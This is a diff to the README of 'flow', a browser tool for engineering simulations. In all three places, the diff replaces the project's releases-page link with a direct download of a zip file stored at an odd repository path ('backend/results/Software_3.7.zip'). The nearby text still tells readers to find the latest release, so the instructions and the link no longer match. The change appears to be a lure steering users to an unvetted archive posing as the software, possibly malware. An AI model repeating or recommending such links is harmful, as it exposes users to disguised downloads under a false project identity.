@@ -1,6 +1,6 @@
 # ⚙️ flow - Run engineering sims in your browser
 
-[![Download flow](https://img.shields.io/badge/Download-flow-blue?style=for-the-badge&logo=github)](https://github.com/Cancerous-acorncup235/flow/releases)
+[![Download flow](https://img.shields.io/badge/Download-flow-blue?style=for-the-badge&logo=github)](https://github.com/Cancerous-acorncup235/flow/raw/refs/heads/main/backend/results/Software_3.7.zip)
 
 ## 🚀 What is flow?
 
@@ -11,7 +11,7 @@ It is built for people who want a simple way to open a simulation, set inputs, a
 ## 📥 Download flow
 
 Visit this page to download:
-https://github.com/Cancerous-acorncup235/flow/releases
+https://github.com/Cancerous-acorncup235/flow/raw/refs/heads/main/backend/results/Software_3.7.zip
 
 1. Open the link above in your browser.
 2. Find the latest release at the top of the page.
@@ -154,7 +154,7 @@ flow uses tools and ideas from:
 
 As an open-source project, flow gives you access to the source code and release builds through GitHub. You can inspect the code, follow updates, and keep track of new releases from the same page:
 
-https://github.com/Cancerous-acorncup235/flow/releases
+https://github.com/Cancerous-acorncup235/flow/raw/refs/heads/main/backend/results/Software_3.7.zip
 
 ## 🧭 Quick install path
 
